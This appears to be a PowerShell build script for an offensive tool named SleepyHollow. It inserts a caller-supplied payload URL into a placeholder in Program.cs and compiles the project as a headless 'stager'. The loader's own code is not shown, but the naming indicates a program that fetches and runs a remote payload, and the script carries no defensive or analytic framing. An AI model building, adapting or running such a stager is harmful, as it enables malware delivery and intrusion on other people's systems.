param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadUrl
)

function Replace-PayloadUrl{
    param(
        [Parameter(Mandatory=$true)]
        [string]$PayloadUrl
    )

    $filePath = ".\Program.cs"
    $content = Get-Content $filePath
    $newContent = $content -replace "<%URL%>", $PayloadUrl
    Set-Content $filePath $newContent
}

function Build-Stager{
    param(
        [Parameter(Mandatory=$true)]
        [string]$PayloadUrl
    )
    Replace-PayloadUrl $PayloadUrl
    $projectPath = ".\SleepyHollow.csproj"
    dotnet build /p:DefineConstants="HEADLESS" $projectPath
}

Build-Stager $PayloadUrl
